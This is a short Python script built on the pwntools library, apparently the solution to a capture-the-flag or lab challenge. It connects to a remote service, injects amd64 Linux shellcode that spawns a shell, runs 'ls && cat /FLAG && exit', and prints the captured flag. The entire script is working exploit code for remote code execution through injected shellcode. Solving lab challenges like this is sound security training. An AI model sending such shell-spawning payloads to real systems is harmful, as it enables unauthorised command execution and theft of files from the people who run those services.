#!/usr/bin/env python

from pwn import *

context.arch = "amd64"
context.os = "linux"
context.endian = "little"

# r = process("./shellcode")
r = remote("up.zoolab.org", 10257)

r.sendafter(b"Enter your code> ", asm(shellcraft.sh()))


r.sendline(b"ls && cat /FLAG && exit")
# r.sendline(b"cat /FLAG")

r.recvuntil(b"var\n")
flag = r.recvuntil(b"}")
print(flag.decode())

r.close()
